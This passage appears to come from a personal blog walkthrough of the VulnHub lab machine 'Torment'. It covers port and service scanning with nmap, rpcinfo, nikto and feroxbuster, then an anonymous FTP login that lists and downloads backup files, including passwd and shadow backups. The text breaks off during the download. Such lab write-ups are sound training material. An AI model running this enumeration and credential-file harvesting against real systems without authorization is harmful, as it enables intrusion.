<meta charset="UTF-8">
<link rel="stylesheet" href="../../../index.css"/>
<link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
<script src="../../../highlight/highlight.min.js"></script>
<script>hljs.highlightAll();</script>

<h1>/f0c1s/blog/sec/vulnhub/digitalworld.local:Torment</h1>

<p>
 <a href="../../../index.html">/blog</a>
 <a href="../../index.html">Security</a>
 <a href="../index.html">VulnHub</a>
 <a href="../../../sec/vulnhub/digitalworld.local-Torment/torment.html">+ digitalworld.local:Torment - 2021.12.22 Wednesday</a>
</p>

<h1 id="digitalworld.local-torment">digitalworld.local Torment</h1>
<pre><code>This is the evil twin of JOY. Unlike JOY, this machine is designed to drive you crazy. Stephen Hawking once mentioned, &quot;God plays dice and throws them into places where they cannot be seen.&quot;

The dice for the machine can all be found on the Internet. Like all other machines built by me, you should not torment yourself by brute force. But perhaps, JOY and TORMENT are two sides of the same coin of satisfaction? Can we really spark joy if we can&#39;t first be tormented to endure sufferance?

This machine guarantees to teach you some new ways of looking at enumeration and exploitation. Unlike all the other OSCP-like machines written by me, this machine will be mind-twisting and maybe mind-blowing. You may lose your mind while at it, but we will still nudge you to... try harder!

This is NOT an easy machine and you should not feel discouraged if you spend a few days headbanging on this machine. At least three competent pentesters I have asked to test this machine report days (thankfully not weeks) of head banging and nerve wrecking. Do this machine if you enjoy being humbled.

If you MUST have hints for this machine (even though they will probably not help you very much until you root the box!): Torment is (#1): what happens when you can&#39;t find your answer on Google, even though it&#39;s there, (#2): what happens when you plead for mercy, but do not succeed, (#3): https://www.youtube.com/watch?v=7ge1yWot4cE

Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.
</code></pre>
<p><a href="http://www.vulnhub.com/entry/digitalworldlocal-torment,299/#download">VulnHub</a> <a href="http://www.vulnhub.com/series/digitalworldlocal,182/">Series: digitalworld.local</a></p>
<figure>
<img src="0.running-box.png" alt="" /><figcaption>0.running-box</figcaption>
</figure>
<p>Extract the archive, import the box, and change network to host by disabling the existing interface, and selecting a new one.</p>
<h2 id="scanning">Scanning</h2>
<pre class="shell"><code>fping -aAqg 192.168.56.1/24
192.168.56.1
192.168.56.2
192.168.56.70
192.168.56.77</code></pre>
<p><a href="http://blog.f0c1s.com/sec/tools/fping.html">Checkout what these options mean in fping</a></p>
<pre class="shell"><code>export RHOST=&quot;192.168.56.77&quot;
export LHOST=&quot;192.168.56.70&quot;
export LPORT=&quot;443&quot;</code></pre>
<p>Setting these variables allow me to fire the commands without keeping track of IP and I don’t need to fill it manually everytime.</p>
<h3 id="default-nmap">default nmap</h3>
<pre class="shell"><code>_n $RHOST
firing nmap 192.168.56.77 | tee nmap.default.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 09:24 IST
Nmap scan report for 192.168.56.77
Host is up (0.00028s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
143/tcp  open  imap
445/tcp  open  microsoft-ds
631/tcp  open  ipp
2049/tcp open  nfs
6667/tcp open  irc
6668/tcp open  irc
6669/tcp open  irc

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds</code></pre>
<h3 id="nmap-tcp-port-scan">nmap tcp port scan</h3>
<pre class="shell"><code>_ntd $RHOST
firing nmap 192.168.56.77 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 09:24 IST
Nmap scan report for 192.168.56.77
Host is up (0.00019s latency).
Not shown: 65516 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.70
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp        112640 Dec 28  2018 alternatives.tar.0
| -rw-r--r--    1 ftp      ftp          4984 Dec 23  2018 alternatives.tar.1.gz
| -rw-r--r--    1 ftp      ftp         95760 Dec 28  2018 apt.extended_states.0
| -rw-r--r--    1 ftp      ftp         10513 Dec 27  2018 apt.extended_states.1.gz
| -rw-r--r--    1 ftp      ftp         10437 Dec 26  2018 apt.extended_states.2.gz
| -rw-r--r--    1 ftp      ftp           559 Dec 23  2018 dpkg.diversions.0
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.1.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.2.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.3.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.4.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.5.gz
| -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.6.gz
| -rw-r--r--    1 ftp      ftp           505 Dec 28  2018 dpkg.statoverride.0
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.1.gz
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.2.gz
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.3.gz
| -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.4.gz
| -rw-r--r--    1 ftp      ftp           281 Dec 27  2018 dpkg.statoverride.5.gz
| -rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.6.gz
| -rw-r--r--    1 ftp      ftp       1719127 Jan 01  2019 dpkg.status.0
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
22/tcp    open  ssh         OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 84:c7:31:7a:21:7d:10:d3:a9:9c:73:c2:c2:2d:d6:77 (RSA)
|   256 a5:12:e7:7f:f0:17:ce:f1:6a:a5:bc:1f:69:ac:14:04 (ECDSA)
|_  256 66:c7:d0:be:8d:9d:9f:bf:78:67:d2:bc:cc:7d:33:b9 (ED25519)
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: TORMENT.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=TORMENT
| Subject Alternative Name: DNS:TORMENT
| Not valid before: 2018-12-23T14:28:47
|_Not valid after:  2028-12-20T14:28:47
80/tcp    open  http        Apache httpd 2.4.25
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.25
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      36248/udp6  mountd
|   100005  1,2,3      46387/tcp6  mountd
|   100005  1,2,3      53095/udp   mountd
|   100005  1,2,3      59577/tcp   mountd
|   100021  1,3,4      33197/tcp   nlockmgr
|   100021  1,3,4      36852/udp   nlockmgr
|   100021  1,3,4      46513/tcp6  nlockmgr
|   100021  1,3,4      46533/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open  imap        Dovecot imapd
|_imap-capabilities: AUTH=PLAIN LITERAL+ listed Pre-login SASL-IR post-login more AUTH=LOGINA0001 have LOGIN-REFERRALS ENABLE capabilities IDLE ID OK IMAP4rev1
445/tcp   open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-title: Home - CUPS 2.2.1
| http-methods: 
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/2.2 IPP/2.1
2049/tcp  open  nfs_acl     3 (RPC #100227)
6667/tcp  open  irc         ngircd
6668/tcp  open  irc         ngircd
6669/tcp  open  irc         ngircd
6672/tcp  open  irc         ngircd
6674/tcp  open  irc         ngircd
33197/tcp open  nlockmgr    1-4 (RPC #100021)
36921/tcp open  mountd      1-3 (RPC #100005)
41909/tcp open  mountd      1-3 (RPC #100005)
59577/tcp open  mountd      1-3 (RPC #100005)
Service Info: Hosts:  TORMENT.localdomain, TORMENT, irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.12-Debian)
|   Computer name: torment
|   NetBIOS computer name: TORMENT\x00
|   Domain name: \x00
|   FQDN: torment
|_  System time: 2021-12-22T17:24:56+08:00
| smb2-time: 
|   date: 2021-12-22T09:24:56
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: TORMENT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
|_clock-skew: mean: 2h50m00s, deviation: 4h37m07s, median: 5h29m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.63 seconds</code></pre>
<h3 id="nmap-udp-scan">nmap udp scan</h3>
<pre class="shell"><code>sudo nmap $RHOST -n -p- -Pn -T4 --min-rate=5000 --top-ports=1000 -sU --open 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 09:29 IST
Nmap scan report for 192.168.56.77
Host is up (0.00084s latency).
Not shown: 91 open|filtered udp ports (no-response), 5 closed udp ports (port-unreach)
PORT     STATE SERVICE
111/udp  open  rpcbind
137/udp  open  netbios-ns
2049/udp open  nfs
5353/udp open  zeroconf
MAC Address: 08:00:27:D4:8D:E9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.09 seconds</code></pre>
<h3 id="nmap-udp-version-scan">nmap udp version scan</h3>
<pre class="shell"><code>sudo nmap $RHOST -n -p111,137,2049,5353 -Pn -T4 --min-rate=5000 -sU --open -sVC
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-22 09:30 IST
Nmap scan report for 192.168.56.77
Host is up (0.00072s latency).

PORT     STATE SERVICE    VERSION
111/udp  open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      36248/udp6  mountd
|   100005  1,2,3      46387/tcp6  mountd
|   100005  1,2,3      53095/udp   mountd
|   100005  1,2,3      59577/tcp   mountd
|   100021  1,3,4      33197/tcp   nlockmgr
|   100021  1,3,4      36852/udp   nlockmgr
|   100021  1,3,4      46513/tcp6  nlockmgr
|   100021  1,3,4      46533/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
137/udp  open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)
| nbns-interfaces: 
|   hostname: TORMENT
|   interfaces: 
|_    192.168.56.77
2049/udp open  nfs_acl    3 (RPC #100227)
5353/udp open  mdns       DNS-based service discovery
| dns-service-discovery: 
|   0/tcp printer
|     Address=192.168.56.77 fe80::a00:27ff:fed4:8de9
|   80/tcp http
|     Address=192.168.56.77 fe80::a00:27ff:fed4:8de9
|   631/tcp ipp
|     Address=192.168.56.77 fe80::a00:27ff:fed4:8de9
|   631/tcp ipps
|_    Address=192.168.56.77 fe80::a00:27ff:fed4:8de9
MAC Address: 08:00:27:D4:8D:E9 (Oracle VirtualBox virtual NIC)
Service Info: Host: TORMENT

Host script results:
|_nbstat: NetBIOS name: TORMENT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.54 seconds</code></pre>
<h3 id="rpcinfo">rpcinfo</h3>
<p><a href="http://blog.f0c1s.com/sec/tools/rpcinfo/rpcinfo.html">Checkout rpcinfo</a></p>
<pre class="shell"><code>rpcinfo -p $RHOST | tee rpcinfo.txt
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  59645  mountd
    100005    1   tcp  36921  mountd
    100005    2   udp  49086  mountd
    100005    2   tcp  41909  mountd
    100005    3   udp  53095  mountd
    100005    3   tcp  59577  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100227    3   udp   2049
    100021    1   udp  36852  nlockmgr
    100021    3   udp  36852  nlockmgr
    100021    4   udp  36852  nlockmgr
    100021    1   tcp  33197  nlockmgr
    100021    3   tcp  33197  nlockmgr
    100021    4   tcp  33197  nlockmgr</code></pre>
<pre class="shell"><code>rpcinfo -s $RHOST                     
   program version(s) netid(s)                         service     owner
    100000  2,3,4     local,udp,tcp,udp6,tcp6          portmapper  superuser
    100005  3,2,1     tcp6,udp6,tcp,udp                mountd      superuser
    100003  4,3       udp6,tcp6,udp,tcp                nfs         superuser
    100227  3         udp6,tcp6,udp,tcp                -           superuser
    100021  4,3,1     tcp6,udp6,tcp,udp                nlockmgr    superuser</code></pre>
<pre class="shell"><code>rpcinfo -m $RHOST 
PORTMAP (version 2) statistics
NULL    SET     UNSET   GETPORT DUMP    CALLIT  
1       0/0     0/0     0/0     2       0/0     

RPCBIND (version 3) statistics
NULL    SET     UNSET   GETADDR DUMP    CALLIT  TIME    U2T     T2U     
0       12/12   3/3     0/0     2       0/0     0       0       0       

RPCBIND (version 4) statistics
NULL    SET     UNSET   GETADDR DUMP    CALLIT  TIME    U2T     T2U     
1       24/24   6/6     2/2     2       0/0     0       0       0       
VERADDR INDRECT GETLIST GETSTAT 
0       0       0       1       

RPCB_GETADDR (version 4) call statistics
prog            vers    netid     success       failure
portmapper      2       tcp       2             0</code></pre>
<h3 id="nikto">nikto</h3>
<pre class="shell"><code>nikto -C all -host http://$RHOST | tee nikto.txt              
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.77
+ Target Hostname:    192.168.56.77
+ Target Port:        80
+ Start Time:         2021-12-22 10:13:43 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 57db166d8fef0, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26522 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-12-22 10:14:53 (GMT5.5) (70 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested</code></pre>
<h2 id="feroxbuster">feroxbuster</h2>
<p><a href="http://blog.f0c1s.com/sec/tools/feroxbuster.html">Checkout feroxbuster</a></p>
<pre class="shell"><code>feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k                  
301        9l       27w      306c http://192.168.56.77/manual
301        9l       27w      313c http://192.168.56.77/manual/images
301        9l       27w      309c http://192.168.56.77/manual/en
301        9l       27w      309c http://192.168.56.77/manual/de
301        9l       27w      309c http://192.168.56.77/manual/fr
301        9l       27w      309c http://192.168.56.77/manual/es
301        9l       27w      309c http://192.168.56.77/manual/tr
301        9l       27w      312c http://192.168.56.77/manual/style
301        9l       27w      309c http://192.168.56.77/manual/ja
301        9l       27w      309c http://192.168.56.77/manual/da
301        9l       27w      309c http://192.168.56.77/manual/ko
301        9l       27w      312c http://192.168.56.77/manual/zh-cn
200        1l        9w       61c http://192.168.56.77/secret
301        9l       27w      312c http://192.168.56.77/manual/pt-br
403       11l       31w      292c http://192.168.56.77/server-status
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_56_77-1640149241.state ...
Scanning: http://192.168.56.77
Scanning: http://192.168.56.77/manual</code></pre>
<h2 id="ftp">FTP</h2>
<pre class="shell"><code>ftp $RHOST 21              
Connected to 192.168.56.77.
220 vsftpd (broken)
Name (192.168.56.77:f0c1s): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
229 Entering Extended Passive Mode (|||46421|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp        112640 Dec 28  2018 alternatives.tar.0
-rw-r--r--    1 ftp      ftp          4984 Dec 23  2018 alternatives.tar.1.gz
-rw-r--r--    1 ftp      ftp         95760 Dec 28  2018 apt.extended_states.0
-rw-r--r--    1 ftp      ftp         10513 Dec 27  2018 apt.extended_states.1.gz
-rw-r--r--    1 ftp      ftp         10437 Dec 26  2018 apt.extended_states.2.gz
-rw-r--r--    1 ftp      ftp           559 Dec 23  2018 dpkg.diversions.0
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.1.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.2.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.3.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.4.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.5.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.6.gz
-rw-r--r--    1 ftp      ftp           505 Dec 28  2018 dpkg.statoverride.0
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.1.gz
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.2.gz
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.3.gz
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.4.gz
-rw-r--r--    1 ftp      ftp           281 Dec 27  2018 dpkg.statoverride.5.gz
-rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.6.gz
-rw-r--r--    1 ftp      ftp       1719127 Jan 01  2019 dpkg.status.0
-rw-r--r--    1 ftp      ftp        493252 Jan 01  2019 dpkg.status.1.gz
-rw-r--r--    1 ftp      ftp        493252 Jan 01  2019 dpkg.status.2.gz
-rw-r--r--    1 ftp      ftp        492279 Dec 28  2018 dpkg.status.3.gz
-rw-r--r--    1 ftp      ftp        492279 Dec 28  2018 dpkg.status.4.gz
-rw-r--r--    1 ftp      ftp        489389 Dec 28  2018 dpkg.status.5.gz
-rw-r--r--    1 ftp      ftp        470278 Dec 27  2018 dpkg.status.6.gz
-rw-------    1 ftp      ftp          1010 Dec 31  2018 group.bak
-rw-------    1 ftp      ftp           840 Dec 31  2018 gshadow.bak
-rw-------    1 ftp      ftp          2485 Dec 31  2018 passwd.bak
-rw-------    1 ftp      ftp          1575 Dec 31  2018 shadow.bak
226 Directory send OK.
ftp&gt; pwd
Remote directory: /
ftp&gt; exit
221 Goodbye.</code></pre>
<h3 id="getting-ftp-files">Getting FTP files</h3>
<pre class="shell"><code>ftp $RHOST 21       
Connected to 192.168.56.77.
220 vsftpd (broken)
Name (192.168.56.77:f0c1s): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||42402|)
150 Here comes the directory listing.
drwxr-xr-x   11 ftp      ftp          4096 Dec 22 17:24 .
drwxr-xr-x   11 ftp      ftp          4096 Dec 22 17:24 ..
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .cups
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .ftp
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .imap
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .mysql
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .nfs
drwxr-xr-x    2 ftp      ftp          4096 Jan 04  2019 .ngircd
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .samba
drwxr-xr-x    2 ftp      ftp          4096 Dec 31  2018 .smtp
drwxr-xr-x    2 ftp      ftp          4096 Jan 04  2019 .ssh
-rw-r--r--    1 ftp      ftp        112640 Dec 28  2018 alternatives.tar.0
-rw-r--r--    1 ftp      ftp          4984 Dec 23  2018 alternatives.tar.1.gz
-rw-r--r--    1 ftp      ftp         95760 Dec 28  2018 apt.extended_states.0
-rw-r--r--    1 ftp      ftp         10513 Dec 27  2018 apt.extended_states.1.gz
-rw-r--r--    1 ftp      ftp         10437 Dec 26  2018 apt.extended_states.2.gz
-rw-r--r--    1 ftp      ftp           559 Dec 23  2018 dpkg.diversions.0
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.1.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.2.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.3.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.4.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.5.gz
-rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.6.gz
-rw-r--r--    1 ftp      ftp           505 Dec 28  2018 dpkg.statoverride.0
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.1.gz
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.2.gz
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.3.gz
-rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.4.gz
-rw-r--r--    1 ftp      ftp           281 Dec 27  2018 dpkg.statoverride.5.gz
-rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.6.gz
-rw-r--r--    1 ftp      ftp       1719127 Jan 01  2019 dpkg.status.0
-rw-r--r--    1 ftp      ftp        493252 Jan 01  2019 dpkg.status.1.gz
-rw-r--r--    1 ftp      ftp        493252 Jan 01  2019 dpkg.status.2.gz
-rw-r--r--    1 ftp      ftp        492279 Dec 28  2018 dpkg.status.3.gz
-rw-r--r--    1 ftp      ftp        492279 Dec 28  2018 dpkg.status.4.gz
-rw-r--r--    1 ftp      ftp        489389 Dec 28  2018 dpkg.status.5.gz
-rw-r--r--    1 ftp      ftp        470278 Dec 27  2018 dpkg.status.6.gz
-rw-------    1 ftp      ftp          1010 Dec 31  2018 group.bak
-rw-------    1 ftp      ftp           840 Dec 31  2018 gshadow.bak
-rw-------    1 ftp      ftp          2485 Dec 31  2018 passwd.bak
-rw-------    1 ftp      ftp          1575 Dec 31  2018 shadow.bak
226 Directory send OK.
ftp&gt; prompt off
Interactive mode off.
ftp&gt; mget *.gz
local: alternatives.tar.1.gz remote: alternatives.tar.1.gz
229 Entering Extended Passive Mode (|||40029|)
150 Opening BINARY mode data connection for alternatives.tar.1.gz (4984 bytes).
100% |**********************************************************************|  4984      118.82 MiB/s    00:00 ETA
226 Transfer complete.
4984 bytes received in 00:00 (7.65 MiB/s)
local: apt.extended_states.1.gz remote: apt.extended_states.1.gz
229 Entering Extended Passive Mode (|||42089|)
150 Opening BINARY mode data connection for apt.extended_states.1.gz (10513 bytes).
100% |**********************************************************************| 10513      233.16 MiB/s    00:00 ETA
226 Transfer complete.
10513 bytes received in 00:00 (13.49 MiB/s)
local: apt.extended_states.2.gz remote: apt.extended_states.2.gz
229 Entering Extended Passive Mode (|||42547|)
150 Opening BINARY mode data connection for apt.extended_states.2.gz (10437 bytes).
100% |**********************************************************************| 10437      226.21 MiB/s    00:00 ETA
226 Transfer complete.
10437 bytes received in 00:00 (22.67 MiB/s)
local: dpkg.diversions.1.gz remote: dpkg.diversions.1.gz
229 Entering Extended Passive Mode (|||44345|)
150 Opening BINARY mode data connection for dpkg.diversions.1.gz (229 bytes).
100% |**********************************************************************|   229        7.53 MiB/s    00:00 ETA
226 Transfer complete.
229 bytes received in 00:00 (573.41 KiB/s)
local: dpkg.diversions.2.gz remote: dpkg.diversions.2.gz
229 Entering Extended Passive Mode (|||48639|)
150 Opening BINARY mode data connection for dpkg.diversions.2.gz (229 bytes).
100% |**********************************************************************|   229        7.53 MiB/s    00:00 ETA
226 Transfer complete.
229 bytes received in 00:00 (765.86 KiB/s)
local: dpkg.diversions.3.gz remote: dpkg.diversions.3.gz
229 Entering Extended Passive Mode (|||45679|)
150 Opening BINARY mode data connection for dpkg.diversions.3.gz (229 bytes).
100% |**********************************************************************|   229        7.79 MiB/s    00:00 ETA
226 Transfer complete.
229 bytes received in 00:00 (635.32 KiB/s)
local: dpkg.diversions.4.gz remote: dpkg.diversions.4.gz
229 Entering Extended Passive Mode (|||47120|)
150 Opening BINARY mode data connection for dpkg.diversions.4.gz (229 bytes).
100% |**********************************************************************|   229        8.39 MiB/s    00:00 ETA
226 Transfer complete.
229 bytes received in 00:00 (813.20 KiB/s)
local: dpkg.diversions.5.gz remote: dpkg.diversions.5.gz
229 Entering Extended Passive Mode (|||49472|)
150 Opening BINARY mode data connection for dpkg.diversions.5.gz (229 bytes).
100% |**********************************************************************|   229        9.49 MiB/s    00:00 ETA
226 Transfer complete.
229 bytes received in 00:00 (898.12 KiB/s)
local: dpkg.diversions.6.gz remote: dpkg.diversions.6.gz
229 Entering Extended Passive Mode (|||44707|)
150 Opening BINARY mode data connection for dpkg.diversions.6.gz (229 bytes).
100% |**********************************************************************|   229        9.92 MiB/s    00:00 ETA
226 Transfer complete.
229 bytes received in 00:00 (707.69 KiB/s)
local: dpkg.statoverride.1.gz remote: dpkg.statoverride.1.gz
229 Entering Extended Passive Mode (|||46515|)
150 Opening BINARY mode data connection for dpkg.statoverride.1.gz (295 bytes).
100% |**********************************************************************|   295       11.25 MiB/s    00:00 ETA
226 Transfer complete.
295 bytes received in 00:00 (0.98 MiB/s)
local: dpkg.statoverride.2.gz remote: dpkg.statoverride.2.gz
229 Entering Extended Passive Mode (|||41825|)
150 Opening BINARY mode data connection for dpkg.statoverride.2.gz (295 bytes).
100% |**********************************************************************|   295       13.39 MiB/s    00:00 ETA
226 Transfer complete.
295 bytes received in 00:00 (1.26 MiB/s)
local: dpkg.statoverride.3.gz remote: dpkg.statoverride.3.gz
229 Entering Extended Passive Mode (|||43884|)
150 Opening BINARY mode data connection for dpkg.statoverride.3.gz (295 bytes).
100% |**********************************************************************|   295       12.78 MiB/s    00:00 ETA
226 Transfer complete.
295 bytes received in 00:00 (1.22 MiB/s)
local: dpkg.statoverride.4.gz remote: dpkg.statoverride.4.gz
229 Entering Extended Passive Mode (|||42345|)
150 Opening BINARY mode data connection for dpkg.statoverride.4.gz (295 bytes).
100% |**********************************************************************|   295       14.06 MiB/s    00:00 ETA
226 Transfer complete.
295 bytes received in 00:00 (1.00 MiB/s)
local: dpkg.statoverride.5.gz remote: dpkg.statoverride.5.gz
229 Entering Extended Passive Mode (|||44531|)
150 Opening BINARY mode data connection for dpkg.statoverride.5.gz (281 bytes).
100% |**********************************************************************|   281       13.39 MiB/s    00:00 ETA
226 Transfer complete.
281 bytes received in 00:00 (1.20 MiB/s)
local: dpkg.statoverride.6.gz remote: dpkg.statoverride.6.gz
229 Entering Extended Passive Mode (|||44496|)
150 Opening BINARY mode data connection for dpkg.statoverride.6.gz (208 bytes).
100% |**********************************************************************|   208        9.91 MiB/s    00:00 ETA
226 Transfer complete.
208 bytes received in 00:00 (822.36 KiB/s)
local: dpkg.status.1.gz remote: dpkg.status.1.gz
229 Entering Extended Passive Mode (|||46840|)
150 Opening BINARY mode data connection for dpkg.status.1.gz (493252 bytes).
100% |**********************************************************************|   481 KiB  255.79 MiB/s    00:00 ETA
226 Transfer complete.
493252 bytes received in 00:00 (237.21 MiB/s)
local: dpkg.status.2.gz remote: dpkg.status.2.gz
229 Entering Extended Passive Mode (|||41967|)
150 Opening BINARY mode data connection for dpkg.status.2.gz (493252 bytes).
100% |**********************************************************************|   481 KiB  332.90 MiB/s    00:00 ETA
226 Transfer complete.
493252 bytes received in 00:00 (303.28 MiB/s)
